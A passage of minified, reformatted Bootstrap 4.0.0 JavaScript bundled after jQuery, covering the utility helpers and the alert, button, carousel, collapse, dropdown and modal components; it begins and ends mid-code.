      return e.$ === ee && (e.$ = $t), t && e.jQuery === ee && (e.jQuery = It), ee;
    }),
    t || (e.jQuery = e.$ = ee),
    ee
  );
}),
  (function (e, t) {
    "object" == typeof exports && "undefined" != typeof module
      ? t(exports, require("jquery"), require("popper.js"))
      : "function" == typeof define && define.amd
      ? define(["exports", "jquery", "popper.js"], t)
      : t((e.bootstrap = {}), e.jQuery, e.Popper);
  })(this, function (e, t, n) {
    "use strict";
    function i(e, t) {
      for (var n = 0; n < t.length; n++) {
        var i = t[n];
        (i.enumerable = i.enumerable || !1), (i.configurable = !0), "value" in i && (i.writable = !0), Object.defineProperty(e, i.key, i);
      }
    }
    function o(e, t, n) {
      return t && i(e.prototype, t), n && i(e, n), e;
    }
    function r() {
      return (r =
        Object.assign ||
        function (e) {
          for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var i in n) Object.prototype.hasOwnProperty.call(n, i) && (e[i] = n[i]);
          }
          return e;
        }).apply(this, arguments);
    }
    (t = t && t.hasOwnProperty("default") ? t.default : t), (n = n && n.hasOwnProperty("default") ? n.default : n);
    var s,
      a,
      l,
      c,
      u,
      d,
      p,
      f,
      h,
      g,
      m,
      v,
      y,
      w,
      b,
      T,
      _,
      C,
      k = (function (e) {
        var t = !1,
          n = {
            TRANSITION_END: "bsTransitionEnd",
            getUID: function (e) {
              do {
                e += ~~(1e6 * Math.random());
              } while (document.getElementById(e));
              return e;
            },
            getSelectorFromElement: function (t) {
              var n,
                i = t.getAttribute("data-target");
              (i && "#" !== i) || (i = t.getAttribute("href") || ""), "#" === i.charAt(0) && ((n = i), (i = n = "function" == typeof e.escapeSelector ? e.escapeSelector(n).substr(1) : n.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")));
              try {
                return e(document).find(i).length > 0 ? i : null;
              } catch (e) {
                return null;
              }
            },
            reflow: function (e) {
              return e.offsetHeight;
            },
            triggerTransitionEnd: function (n) {
              e(n).trigger(t.end);
            },
            supportsTransitionEnd: function () {
              return Boolean(t);
            },
            isElement: function (e) {
              return (e[0] || e).nodeType;
            },
            typeCheckConfig: function (e, t, i) {
              for (var o in i)
                if (Object.prototype.hasOwnProperty.call(i, o)) {
                  var r = i[o],
                    s = t[o],
                    a =
                      s && n.isElement(s)
                        ? "element"
                        : ((l = s),
                          {}.toString
                            .call(l)
                            .match(/\s([a-zA-Z]+)/)[1]
                            .toLowerCase());
                  if (!new RegExp(r).test(a)) throw new Error(e.toUpperCase() + ': Option "' + o + '" provided type "' + a + '" but expected type "' + r + '".');
                }
              var l;
            },
          };
        return (
          (t = ("undefined" == typeof window || !window.QUnit) && { end: "transitionend" }),
          (e.fn.emulateTransitionEnd = function (t) {
            var i = this,
              o = !1;
            return (
              e(this).one(n.TRANSITION_END, function () {
                o = !0;
              }),
              setTimeout(function () {
                o || n.triggerTransitionEnd(i);
              }, t),
              this
            );
          }),
          n.supportsTransitionEnd() &&
            (e.event.special[n.TRANSITION_END] = {
              bindType: t.end,
              delegateType: t.end,
              handle: function (t) {
                if (e(t.target).is(this)) return t.handleObj.handler.apply(this, arguments);
              },
            }),
          n
        );
      })(t),
      S =
        ((a = "alert"),
        (c = "." + (l = "bs.alert")),
        (u = (s = t).fn[a]),
        (d = { CLOSE: "close" + c, CLOSED: "closed" + c, CLICK_DATA_API: "click" + c + ".data-api" }),
        "alert",
        "fade",
        "show",
        (p = (function () {
          function e(e) {
            this._element = e;
          }
          var t = e.prototype;
          return (
            (t.close = function (e) {
              e = e || this._element;
              var t = this._getRootElement(e);
              this._triggerCloseEvent(t).isDefaultPrevented() || this._removeElement(t);
            }),
            (t.dispose = function () {
              s.removeData(this._element, l), (this._element = null);
            }),
            (t._getRootElement = function (e) {
              var t = k.getSelectorFromElement(e),
                n = !1;
              return t && (n = s(t)[0]), n || (n = s(e).closest(".alert")[0]), n;
            }),
            (t._triggerCloseEvent = function (e) {
              var t = s.Event(d.CLOSE);
              return s(e).trigger(t), t;
            }),
            (t._removeElement = function (e) {
              var t = this;
              s(e).removeClass("show"),
                k.supportsTransitionEnd() && s(e).hasClass("fade")
                  ? s(e)
                      .one(k.TRANSITION_END, function (n) {
                        return t._destroyElement(e, n);
                      })
                      .emulateTransitionEnd(150)
                  : this._destroyElement(e);
            }),
            (t._destroyElement = function (e) {
              s(e).detach().trigger(d.CLOSED).remove();
            }),
            (e._jQueryInterface = function (t) {
              return this.each(function () {
                var n = s(this),
                  i = n.data(l);
                i || ((i = new e(this)), n.data(l, i)), "close" === t && i[t](this);
              });
            }),
            (e._handleDismiss = function (e) {
              return function (t) {
                t && t.preventDefault(), e.close(this);
              };
            }),
            o(e, null, [
              {
                key: "VERSION",
                get: function () {
                  return "4.0.0";
                },
              },
            ]),
            e
          );
        })()),
        s(document).on(d.CLICK_DATA_API, '[data-dismiss="alert"]', p._handleDismiss(new p())),
        (s.fn[a] = p._jQueryInterface),
        (s.fn[a].Constructor = p),
        (s.fn[a].noConflict = function () {
          return (s.fn[a] = u), p._jQueryInterface;
        }),
        p),
      x =
        ((h = "button"),
        (m = "." + (g = "bs.button")),
        (v = ".data-api"),
        (y = (f = t).fn[h]),
        (w = "active"),
        "btn",
        "focus",
        (b = '[data-toggle^="button"]'),
        '[data-toggle="buttons"]',
        "input",
        ".active",
        (T = ".btn"),
        (_ = { CLICK_DATA_API: "click" + m + v, FOCUS_BLUR_DATA_API: "focus" + m + v + " blur" + m + v }),
        (C = (function () {
          function e(e) {
            this._element = e;
          }
          var t = e.prototype;
          return (
            (t.toggle = function () {
              var e = !0,
                t = !0,
                n = f(this._element).closest('[data-toggle="buttons"]')[0];
              if (n) {
                var i = f(this._element).find("input")[0];
                if (i) {
                  if ("radio" === i.type)
                    if (i.checked && f(this._element).hasClass(w)) e = !1;
                    else {
                      var o = f(n).find(".active")[0];
                      o && f(o).removeClass(w);
                    }
                  if (e) {
                    if (i.hasAttribute("disabled") || n.hasAttribute("disabled") || i.classList.contains("disabled") || n.classList.contains("disabled")) return;
                    (i.checked = !f(this._element).hasClass(w)), f(i).trigger("change");
                  }
                  i.focus(), (t = !1);
                }
              }
              t && this._element.setAttribute("aria-pressed", !f(this._element).hasClass(w)), e && f(this._element).toggleClass(w);
            }),
            (t.dispose = function () {
              f.removeData(this._element, g), (this._element = null);
            }),
            (e._jQueryInterface = function (t) {
              return this.each(function () {
                var n = f(this).data(g);
                n || ((n = new e(this)), f(this).data(g, n)), "toggle" === t && n[t]();
              });
            }),
            o(e, null, [
              {
                key: "VERSION",
                get: function () {
                  return "4.0.0";
                },
              },
            ]),
            e
          );
        })()),
        f(document)
          .on(_.CLICK_DATA_API, b, function (e) {
            e.preventDefault();
            var t = e.target;
            f(t).hasClass("btn") || (t = f(t).closest(T)), C._jQueryInterface.call(f(t), "toggle");
          })
          .on(_.FOCUS_BLUR_DATA_API, b, function (e) {
            var t = f(e.target).closest(T)[0];
            f(t).toggleClass("focus", /^focus(in)?$/.test(e.type));
          }),
        (f.fn[h] = C._jQueryInterface),
        (f.fn[h].Constructor = C),
        (f.fn[h].noConflict = function () {
          return (f.fn[h] = y), C._jQueryInterface;
        }),
        C),
      E = (function (e) {
        var t = "carousel",
          n = "bs.carousel",
          i = "." + n,
          s = e.fn[t],
          a = { interval: 5e3, keyboard: !0, slide: !1, pause: "hover", wrap: !0 },
          l = { interval: "(number|boolean)", keyboard: "boolean", slide: "(boolean|string)", pause: "(string|boolean)", wrap: "boolean" },
          c = "next",
          u = "prev",
          d = {
            SLIDE: "slide" + i,
            SLID: "slid" + i,
            KEYDOWN: "keydown" + i,
            MOUSEENTER: "mouseenter" + i,
            MOUSELEAVE: "mouseleave" + i,
            TOUCHEND: "touchend" + i,
            LOAD_DATA_API: "load" + i + ".data-api",
            CLICK_DATA_API: "click" + i + ".data-api",
          },
          p = "active",
          f = ".active",
          h = ".active.carousel-item",
          g = ".carousel-item",
          m = ".carousel-item-next, .carousel-item-prev",
          v = ".carousel-indicators",
          y = "[data-slide], [data-slide-to]",
          w = '[data-ride="carousel"]',
          b = (function () {
            function s(t, n) {
              (this._items = null),
                (this._interval = null),
                (this._activeElement = null),
                (this._isPaused = !1),
                (this._isSliding = !1),
                (this.touchTimeout = null),
                (this._config = this._getConfig(n)),
                (this._element = e(t)[0]),
                (this._indicatorsElement = e(this._element).find(v)[0]),
                this._addEventListeners();
            }
            var y = s.prototype;
            return (
              (y.next = function () {
                this._isSliding || this._slide(c);
              }),
              (y.nextWhenVisible = function () {
                !document.hidden && e(this._element).is(":visible") && "hidden" !== e(this._element).css("visibility") && this.next();
              }),
              (y.prev = function () {
                this._isSliding || this._slide(u);
              }),
              (y.pause = function (t) {
                t || (this._isPaused = !0), e(this._element).find(m)[0] && k.supportsTransitionEnd() && (k.triggerTransitionEnd(this._element), this.cycle(!0)), clearInterval(this._interval), (this._interval = null);
              }),
              (y.cycle = function (e) {
                e || (this._isPaused = !1),
                  this._interval && (clearInterval(this._interval), (this._interval = null)),
                  this._config.interval && !this._isPaused && (this._interval = setInterval((document.visibilityState ? this.nextWhenVisible : this.next).bind(this), this._config.interval));
              }),
              (y.to = function (t) {
                var n = this;
                this._activeElement = e(this._element).find(h)[0];
                var i = this._getItemIndex(this._activeElement);
                if (!(t > this._items.length - 1 || t < 0))
                  if (this._isSliding)
                    e(this._element).one(d.SLID, function () {
                      return n.to(t);
                    });
                  else {
                    if (i === t) return this.pause(), void this.cycle();
                    var o = t > i ? c : u;
                    this._slide(o, this._items[t]);
                  }
              }),
              (y.dispose = function () {
                e(this._element).off(i),
                  e.removeData(this._element, n),
                  (this._items = null),
                  (this._config = null),
                  (this._element = null),
                  (this._interval = null),
                  (this._isPaused = null),
                  (this._isSliding = null),
                  (this._activeElement = null),
                  (this._indicatorsElement = null);
              }),
              (y._getConfig = function (e) {
                return (e = r({}, a, e)), k.typeCheckConfig(t, e, l), e;
              }),
              (y._addEventListeners = function () {
                var t = this;
                this._config.keyboard &&
                  e(this._element).on(d.KEYDOWN, function (e) {
                    return t._keydown(e);
                  }),
                  "hover" === this._config.pause &&
                    (e(this._element)
                      .on(d.MOUSEENTER, function (e) {
                        return t.pause(e);
                      })
                      .on(d.MOUSELEAVE, function (e) {
                        return t.cycle(e);
                      }),
                    "ontouchstart" in document.documentElement &&
                      e(this._element).on(d.TOUCHEND, function () {
                        t.pause(),
                          t.touchTimeout && clearTimeout(t.touchTimeout),
                          (t.touchTimeout = setTimeout(function (e) {
                            return t.cycle(e);
                          }, 500 + t._config.interval));
                      }));
              }),
              (y._keydown = function (e) {
                if (!/input|textarea/i.test(e.target.tagName))
                  switch (e.which) {
                    case 37:
                      e.preventDefault(), this.prev();
                      break;
                    case 39:
                      e.preventDefault(), this.next();
                  }
              }),
              (y._getItemIndex = function (t) {
                return (this._items = e.makeArray(e(t).parent().find(g))), this._items.indexOf(t);
              }),
              (y._getItemByDirection = function (e, t) {
                var n = e === c,
                  i = e === u,
                  o = this._getItemIndex(t),
                  r = this._items.length - 1;
                if (((i && 0 === o) || (n && o === r)) && !this._config.wrap) return t;
                var s = (o + (e === u ? -1 : 1)) % this._items.length;
                return -1 === s ? this._items[this._items.length - 1] : this._items[s];
              }),
              (y._triggerSlideEvent = function (t, n) {
                var i = this._getItemIndex(t),
                  o = this._getItemIndex(e(this._element).find(h)[0]),
                  r = e.Event(d.SLIDE, { relatedTarget: t, direction: n, from: o, to: i });
                return e(this._element).trigger(r), r;
              }),
              (y._setActiveIndicatorElement = function (t) {
                if (this._indicatorsElement) {
                  e(this._indicatorsElement).find(f).removeClass(p);
                  var n = this._indicatorsElement.children[this._getItemIndex(t)];
                  n && e(n).addClass(p);
                }
              }),
              (y._slide = function (t, n) {
                var i,
                  o,
                  r,
                  s = this,
                  a = e(this._element).find(h)[0],
                  l = this._getItemIndex(a),
                  u = n || (a && this._getItemByDirection(t, a)),
                  f = this._getItemIndex(u),
                  g = Boolean(this._interval);
                if ((t === c ? ((i = "carousel-item-left"), (o = "carousel-item-next"), (r = "left")) : ((i = "carousel-item-right"), (o = "carousel-item-prev"), (r = "right")), u && e(u).hasClass(p))) this._isSliding = !1;
                else if (!this._triggerSlideEvent(u, r).isDefaultPrevented() && a && u) {
                  (this._isSliding = !0), g && this.pause(), this._setActiveIndicatorElement(u);
                  var m = e.Event(d.SLID, { relatedTarget: u, direction: r, from: l, to: f });
                  k.supportsTransitionEnd() && e(this._element).hasClass("slide")
                    ? (e(u).addClass(o),
                      k.reflow(u),
                      e(a).addClass(i),
                      e(u).addClass(i),
                      e(a)
                        .one(k.TRANSITION_END, function () {
                          e(u)
                            .removeClass(i + " " + o)
                            .addClass(p),
                            e(a).removeClass(p + " " + o + " " + i),
                            (s._isSliding = !1),
                            setTimeout(function () {
                              return e(s._element).trigger(m);
                            }, 0);
                        })
                        .emulateTransitionEnd(600))
                    : (e(a).removeClass(p), e(u).addClass(p), (this._isSliding = !1), e(this._element).trigger(m)),
                    g && this.cycle();
                }
              }),
              (s._jQueryInterface = function (t) {
                return this.each(function () {
                  var i = e(this).data(n),
                    o = r({}, a, e(this).data());
                  "object" == typeof t && (o = r({}, o, t));
                  var l = "string" == typeof t ? t : o.slide;
                  if ((i || ((i = new s(this, o)), e(this).data(n, i)), "number" == typeof t)) i.to(t);
                  else if ("string" == typeof l) {
                    if (void 0 === i[l]) throw new TypeError('No method named "' + l + '"');
                    i[l]();
                  } else o.interval && (i.pause(), i.cycle());
                });
              }),
              (s._dataApiClickHandler = function (t) {
                var i = k.getSelectorFromElement(this);
                if (i) {
                  var o = e(i)[0];
                  if (o && e(o).hasClass("carousel")) {
                    var a = r({}, e(o).data(), e(this).data()),
                      l = this.getAttribute("data-slide-to");
                    l && (a.interval = !1), s._jQueryInterface.call(e(o), a), l && e(o).data(n).to(l), t.preventDefault();
                  }
                }
              }),
              o(s, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return a;
                  },
                },
              ]),
              s
            );
          })();
        return (
          e(document).on(d.CLICK_DATA_API, y, b._dataApiClickHandler),
          e(window).on(d.LOAD_DATA_API, function () {
            e(w).each(function () {
              var t = e(this);
              b._jQueryInterface.call(t, t.data());
            });
          }),
          (e.fn[t] = b._jQueryInterface),
          (e.fn[t].Constructor = b),
          (e.fn[t].noConflict = function () {
            return (e.fn[t] = s), b._jQueryInterface;
          }),
          b
        );
      })(t),
      A = (function (e) {
        var t = "collapse",
          n = "bs.collapse",
          i = "." + n,
          s = e.fn[t],
          a = { toggle: !0, parent: "" },
          l = { toggle: "boolean", parent: "(string|element)" },
          c = { SHOW: "show" + i, SHOWN: "shown" + i, HIDE: "hide" + i, HIDDEN: "hidden" + i, CLICK_DATA_API: "click" + i + ".data-api" },
          u = "show",
          d = "collapse",
          p = "collapsing",
          f = "collapsed",
          h = "width",
          g = ".show, .collapsing",
          m = '[data-toggle="collapse"]',
          v = (function () {
            function i(t, n) {
              (this._isTransitioning = !1),
                (this._element = t),
                (this._config = this._getConfig(n)),
                (this._triggerArray = e.makeArray(e('[data-toggle="collapse"][href="#' + t.id + '"],[data-toggle="collapse"][data-target="#' + t.id + '"]')));
              for (var i = e(m), o = 0; o < i.length; o++) {
                var r = i[o],
                  s = k.getSelectorFromElement(r);
                null !== s && e(s).filter(t).length > 0 && ((this._selector = s), this._triggerArray.push(r));
              }
              (this._parent = this._config.parent ? this._getParent() : null), this._config.parent || this._addAriaAndCollapsedClass(this._element, this._triggerArray), this._config.toggle && this.toggle();
            }
            var s = i.prototype;
            return (
              (s.toggle = function () {
                e(this._element).hasClass(u) ? this.hide() : this.show();
              }),
              (s.show = function () {
                var t,
                  o,
                  r = this;
                if (
                  !(
                    this._isTransitioning ||
                    e(this._element).hasClass(u) ||
                    (this._parent &&
                      0 ===
                        (t = e.makeArray(
                          e(this._parent)
                            .find(g)
                            .filter('[data-parent="' + this._config.parent + '"]')
                        )).length &&
                      (t = null),
                    t && (o = e(t).not(this._selector).data(n)) && o._isTransitioning)
                  )
                ) {
                  var s = e.Event(c.SHOW);
                  if ((e(this._element).trigger(s), !s.isDefaultPrevented())) {
                    t && (i._jQueryInterface.call(e(t).not(this._selector), "hide"), o || e(t).data(n, null));
                    var a = this._getDimension();
                    e(this._element).removeClass(d).addClass(p), (this._element.style[a] = 0), this._triggerArray.length > 0 && e(this._triggerArray).removeClass(f).attr("aria-expanded", !0), this.setTransitioning(!0);
                    var l = function () {
                      e(r._element).removeClass(p).addClass(d).addClass(u), (r._element.style[a] = ""), r.setTransitioning(!1), e(r._element).trigger(c.SHOWN);
                    };
                    if (k.supportsTransitionEnd()) {
                      var h = "scroll" + (a[0].toUpperCase() + a.slice(1));
                      e(this._element).one(k.TRANSITION_END, l).emulateTransitionEnd(600), (this._element.style[a] = this._element[h] + "px");
                    } else l();
                  }
                }
              }),
              (s.hide = function () {
                var t = this;
                if (!this._isTransitioning && e(this._element).hasClass(u)) {
                  var n = e.Event(c.HIDE);
                  if ((e(this._element).trigger(n), !n.isDefaultPrevented())) {
                    var i = this._getDimension();
                    if (((this._element.style[i] = this._element.getBoundingClientRect()[i] + "px"), k.reflow(this._element), e(this._element).addClass(p).removeClass(d).removeClass(u), this._triggerArray.length > 0))
                      for (var o = 0; o < this._triggerArray.length; o++) {
                        var r = this._triggerArray[o],
                          s = k.getSelectorFromElement(r);
                        null !== s && (e(s).hasClass(u) || e(r).addClass(f).attr("aria-expanded", !1));
                      }
                    this.setTransitioning(!0);
                    var a = function () {
                      t.setTransitioning(!1), e(t._element).removeClass(p).addClass(d).trigger(c.HIDDEN);
                    };
                    (this._element.style[i] = ""), k.supportsTransitionEnd() ? e(this._element).one(k.TRANSITION_END, a).emulateTransitionEnd(600) : a();
                  }
                }
              }),
              (s.setTransitioning = function (e) {
                this._isTransitioning = e;
              }),
              (s.dispose = function () {
                e.removeData(this._element, n), (this._config = null), (this._parent = null), (this._element = null), (this._triggerArray = null), (this._isTransitioning = null);
              }),
              (s._getConfig = function (e) {
                return ((e = r({}, a, e)).toggle = Boolean(e.toggle)), k.typeCheckConfig(t, e, l), e;
              }),
              (s._getDimension = function () {
                return e(this._element).hasClass(h) ? h : "height";
              }),
              (s._getParent = function () {
                var t = this,
                  n = null;
                k.isElement(this._config.parent) ? ((n = this._config.parent), void 0 !== this._config.parent.jquery && (n = this._config.parent[0])) : (n = e(this._config.parent)[0]);
                var o = '[data-toggle="collapse"][data-parent="' + this._config.parent + '"]';
                return (
                  e(n)
                    .find(o)
                    .each(function (e, n) {
                      t._addAriaAndCollapsedClass(i._getTargetFromElement(n), [n]);
                    }),
                  n
                );
              }),
              (s._addAriaAndCollapsedClass = function (t, n) {
                if (t) {
                  var i = e(t).hasClass(u);
                  n.length > 0 && e(n).toggleClass(f, !i).attr("aria-expanded", i);
                }
              }),
              (i._getTargetFromElement = function (t) {
                var n = k.getSelectorFromElement(t);
                return n ? e(n)[0] : null;
              }),
              (i._jQueryInterface = function (t) {
                return this.each(function () {
                  var o = e(this),
                    s = o.data(n),
                    l = r({}, a, o.data(), "object" == typeof t && t);
                  if ((!s && l.toggle && /show|hide/.test(t) && (l.toggle = !1), s || ((s = new i(this, l)), o.data(n, s)), "string" == typeof t)) {
                    if (void 0 === s[t]) throw new TypeError('No method named "' + t + '"');
                    s[t]();
                  }
                });
              }),
              o(i, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return a;
                  },
                },
              ]),
              i
            );
          })();
        return (
          e(document).on(c.CLICK_DATA_API, m, function (t) {
            "A" === t.currentTarget.tagName && t.preventDefault();
            var i = e(this),
              o = k.getSelectorFromElement(this);
            e(o).each(function () {
              var t = e(this),
                o = t.data(n) ? "toggle" : i.data();
              v._jQueryInterface.call(t, o);
            });
          }),
          (e.fn[t] = v._jQueryInterface),
          (e.fn[t].Constructor = v),
          (e.fn[t].noConflict = function () {
            return (e.fn[t] = s), v._jQueryInterface;
          }),
          v
        );
      })(t),
      D = (function (e) {
        var t = "dropdown",
          i = "bs.dropdown",
          s = "." + i,
          a = ".data-api",
          l = e.fn[t],
          c = new RegExp("38|40|27"),
          u = { HIDE: "hide" + s, HIDDEN: "hidden" + s, SHOW: "show" + s, SHOWN: "shown" + s, CLICK: "click" + s, CLICK_DATA_API: "click" + s + a, KEYDOWN_DATA_API: "keydown" + s + a, KEYUP_DATA_API: "keyup" + s + a },
          d = "disabled",
          p = "show",
          f = "dropup",
          h = "dropdown-menu-right",
          g = '[data-toggle="dropdown"]',
          m = ".dropdown-menu",
          v = { offset: 0, flip: !0, boundary: "scrollParent" },
          y = { offset: "(number|string|function)", flip: "boolean", boundary: "(string|element)" },
          w = (function () {
            function a(e, t) {
              (this._element = e), (this._popper = null), (this._config = this._getConfig(t)), (this._menu = this._getMenuElement()), (this._inNavbar = this._detectNavbar()), this._addEventListeners();
            }
            var l = a.prototype;
            return (
              (l.toggle = function () {
                if (!this._element.disabled && !e(this._element).hasClass(d)) {
                  var t = a._getParentFromElement(this._element),
                    i = e(this._menu).hasClass(p);
                  if ((a._clearMenus(), !i)) {
                    var o = { relatedTarget: this._element },
                      r = e.Event(u.SHOW, o);
                    if ((e(t).trigger(r), !r.isDefaultPrevented())) {
                      if (!this._inNavbar) {
                        if (void 0 === n) throw new TypeError("Bootstrap dropdown require Popper.js (https://popper.js.org)");
                        var s = this._element;
                        e(t).hasClass(f) && (e(this._menu).hasClass("dropdown-menu-left") || e(this._menu).hasClass(h)) && (s = t),
                          "scrollParent" !== this._config.boundary && e(t).addClass("position-static"),
                          (this._popper = new n(s, this._menu, this._getPopperConfig()));
                      }
                      "ontouchstart" in document.documentElement && 0 === e(t).closest(".navbar-nav").length && e("body").children().on("mouseover", null, e.noop),
                        this._element.focus(),
                        this._element.setAttribute("aria-expanded", !0),
                        e(this._menu).toggleClass(p),
                        e(t).toggleClass(p).trigger(e.Event(u.SHOWN, o));
                    }
                  }
                }
              }),
              (l.dispose = function () {
                e.removeData(this._element, i), e(this._element).off(s), (this._element = null), (this._menu = null), null !== this._popper && (this._popper.destroy(), (this._popper = null));
              }),
              (l.update = function () {
                (this._inNavbar = this._detectNavbar()), null !== this._popper && this._popper.scheduleUpdate();
              }),
              (l._addEventListeners = function () {
                var t = this;
                e(this._element).on(u.CLICK, function (e) {
                  e.preventDefault(), e.stopPropagation(), t.toggle();
                });
              }),
              (l._getConfig = function (n) {
                return (n = r({}, this.constructor.Default, e(this._element).data(), n)), k.typeCheckConfig(t, n, this.constructor.DefaultType), n;
              }),
              (l._getMenuElement = function () {
                if (!this._menu) {
                  var t = a._getParentFromElement(this._element);
                  this._menu = e(t).find(m)[0];
                }
                return this._menu;
              }),
              (l._getPlacement = function () {
                var t = e(this._element).parent(),
                  n = "bottom-start";
                return (
                  t.hasClass(f)
                    ? ((n = "top-start"), e(this._menu).hasClass(h) && (n = "top-end"))
                    : t.hasClass("dropright")
                    ? (n = "right-start")
                    : t.hasClass("dropleft")
                    ? (n = "left-start")
                    : e(this._menu).hasClass(h) && (n = "bottom-end"),
                  n
                );
              }),
              (l._detectNavbar = function () {
                return e(this._element).closest(".navbar").length > 0;
              }),
              (l._getPopperConfig = function () {
                var e = this,
                  t = {};
                return (
                  "function" == typeof this._config.offset
                    ? (t.fn = function (t) {
                        return (t.offsets = r({}, t.offsets, e._config.offset(t.offsets) || {})), t;
                      })
                    : (t.offset = this._config.offset),
                  { placement: this._getPlacement(), modifiers: { offset: t, flip: { enabled: this._config.flip }, preventOverflow: { boundariesElement: this._config.boundary } } }
                );
              }),
              (a._jQueryInterface = function (t) {
                return this.each(function () {
                  var n = e(this).data(i);
                  if ((n || ((n = new a(this, "object" == typeof t ? t : null)), e(this).data(i, n)), "string" == typeof t)) {
                    if (void 0 === n[t]) throw new TypeError('No method named "' + t + '"');
                    n[t]();
                  }
                });
              }),
              (a._clearMenus = function (t) {
                if (!t || (3 !== t.which && ("keyup" !== t.type || 9 === t.which)))
                  for (var n = e.makeArray(e(g)), o = 0; o < n.length; o++) {
                    var r = a._getParentFromElement(n[o]),
                      s = e(n[o]).data(i),
                      l = { relatedTarget: n[o] };
                    if (s) {
                      var c = s._menu;
                      if (e(r).hasClass(p) && !(t && (("click" === t.type && /input|textarea/i.test(t.target.tagName)) || ("keyup" === t.type && 9 === t.which)) && e.contains(r, t.target))) {
                        var d = e.Event(u.HIDE, l);
                        e(r).trigger(d),
                          d.isDefaultPrevented() ||
                            ("ontouchstart" in document.documentElement && e("body").children().off("mouseover", null, e.noop),
                            n[o].setAttribute("aria-expanded", "false"),
                            e(c).removeClass(p),
                            e(r).removeClass(p).trigger(e.Event(u.HIDDEN, l)));
                      }
                    }
                  }
              }),
              (a._getParentFromElement = function (t) {
                var n,
                  i = k.getSelectorFromElement(t);
                return i && (n = e(i)[0]), n || t.parentNode;
              }),
              (a._dataApiKeydownHandler = function (t) {
                if (
                  (/input|textarea/i.test(t.target.tagName) ? !(32 === t.which || (27 !== t.which && ((40 !== t.which && 38 !== t.which) || e(t.target).closest(m).length))) : c.test(t.which)) &&
                  (t.preventDefault(), t.stopPropagation(), !this.disabled && !e(this).hasClass(d))
                ) {
                  var n = a._getParentFromElement(this),
                    i = e(n).hasClass(p);
                  if ((i || (27 === t.which && 32 === t.which)) && (!i || (27 !== t.which && 32 !== t.which))) {
                    var o = e(n).find(".dropdown-menu .dropdown-item:not(.disabled)").get();
                    if (0 !== o.length) {
                      var r = o.indexOf(t.target);
                      38 === t.which && r > 0 && r--, 40 === t.which && r < o.length - 1 && r++, r < 0 && (r = 0), o[r].focus();
                    }
                  } else {
                    if (27 === t.which) {
                      var s = e(n).find(g)[0];
                      e(s).trigger("focus");
                    }
                    e(this).trigger("click");
                  }
                }
              }),
              o(a, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return v;
                  },
                },
                {
                  key: "DefaultType",
                  get: function () {
                    return y;
                  },
                },
              ]),
              a
            );
          })();
        return (
          e(document)
            .on(u.KEYDOWN_DATA_API, g, w._dataApiKeydownHandler)
            .on(u.KEYDOWN_DATA_API, m, w._dataApiKeydownHandler)
            .on(u.CLICK_DATA_API + " " + u.KEYUP_DATA_API, w._clearMenus)
            .on(u.CLICK_DATA_API, g, function (t) {
              t.preventDefault(), t.stopPropagation(), w._jQueryInterface.call(e(this), "toggle");
            })
            .on(u.CLICK_DATA_API, ".dropdown form", function (e) {
              e.stopPropagation();
            }),
          (e.fn[t] = w._jQueryInterface),
          (e.fn[t].Constructor = w),
          (e.fn[t].noConflict = function () {
            return (e.fn[t] = l), w._jQueryInterface;
          }),
          w
        );
      })(t),
      N = (function (e) {
        var t = "bs.modal",
          n = "." + t,
          i = e.fn.modal,
          s = { backdrop: !0, keyboard: !0, focus: !0, show: !0 },
          a = { backdrop: "(boolean|string)", keyboard: "boolean", focus: "boolean", show: "boolean" },
          l = {
            HIDE: "hide" + n,
            HIDDEN: "hidden" + n,
            SHOW: "show" + n,
            SHOWN: "shown" + n,
            FOCUSIN: "focusin" + n,
            RESIZE: "resize" + n,
            CLICK_DISMISS: "click.dismiss" + n,
            KEYDOWN_DISMISS: "keydown.dismiss" + n,
            MOUSEUP_DISMISS: "mouseup.dismiss" + n,
            MOUSEDOWN_DISMISS: "mousedown.dismiss" + n,
            CLICK_DATA_API: "click" + n + ".data-api",
          },
          c = "modal-open",
          u = "fade",
          d = "show",
          p = ".modal-dialog",
          f = '[data-toggle="modal"]',
          h = '[data-dismiss="modal"]',
          g = ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top",
          m = ".sticky-top",
          v = ".navbar-toggler",
          y = (function () {
            function i(t, n) {
              (this._config = this._getConfig(n)),
                (this._element = t),
                (this._dialog = e(t).find(p)[0]),
                (this._backdrop = null),
                (this._isShown = !1),
                (this._isBodyOverflowing = !1),
                (this._ignoreBackdropClick = !1),
                (this._originalBodyPadding = 0),
                (this._scrollbarWidth = 0);
            }
            var f = i.prototype;
            return (
              (f.toggle = function (e) {
                return this._isShown ? this.hide() : this.show(e);
              }),
              (f.show = function (t) {
                var n = this;
                if (!this._isTransitioning && !this._isShown) {
                  k.supportsTransitionEnd() && e(this._element).hasClass(u) && (this._isTransitioning = !0);
                  var i = e.Event(l.SHOW, { relatedTarget: t });
                  e(this._element).trigger(i),
                    this._isShown ||
                      i.isDefaultPrevented() ||
                      ((this._isShown = !0),
                      this._checkScrollbar(),
                      this._setScrollbar(),
                      this._adjustDialog(),
                      e(document.body).addClass(c),
                      this._setEscapeEvent(),
                      this._setResizeEvent(),
                      e(this._element).on(l.CLICK_DISMISS, h, function (e) {
                        return n.hide(e);
                      }),
                      e(this._dialog).on(l.MOUSEDOWN_DISMISS, function () {
                        e(n._element).one(l.MOUSEUP_DISMISS, function (t) {
                          e(t.target).is(n._element) && (n._ignoreBackdropClick = !0);
                        });
                      }),
                      this._showBackdrop(function () {
                        return n._showElement(t);
                      }));
                }
              }),
              (f.hide = function (t) {
                var n = this;
                if ((t && t.preventDefault(), !this._isTransitioning && this._isShown)) {
                  var i = e.Event(l.HIDE);
                  if ((e(this._element).trigger(i), this._isShown && !i.isDefaultPrevented())) {
                    this._isShown = !1;
                    var o = k.supportsTransitionEnd() && e(this._element).hasClass(u);
                    o && (this._isTransitioning = !0),
                      this._setEscapeEvent(),
                      this._setResizeEvent(),
                      e(document).off(l.FOCUSIN),
                      e(this._element).removeClass(d),
                      e(this._element).off(l.CLICK_DISMISS),
                      e(this._dialog).off(l.MOUSEDOWN_DISMISS),
                      o
                        ? e(this._element)
                            .one(k.TRANSITION_END, function (e) {
                              return n._hideModal(e);
                            })
                            .emulateTransitionEnd(300)
